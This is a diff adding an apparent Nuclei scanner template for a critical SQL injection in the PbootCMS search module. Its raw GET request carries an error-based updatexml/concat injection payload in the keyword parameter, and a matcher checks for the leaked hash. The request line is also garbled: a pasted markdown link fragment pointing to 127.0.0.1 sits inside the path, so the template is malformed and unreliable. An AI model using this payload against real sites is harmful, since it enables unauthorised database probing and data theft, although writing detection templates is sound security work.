@@ -1,0 +1,22 @@
+id: pbootcms-search-sql-injection
+
+info:
+  name: PbootCMS search SQL注入漏洞
+  author: daffainfo
+  severity: critical
+  description: PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息。漏洞影响:PbootCMS < 1.2.1  app="PBOOTCMS"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: pbootcms,pboot,sqli
+http:
+  - raw:
+      - |+
+        GET /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,md5(1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,md5(1),0x7e),1));%23=123) HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849'
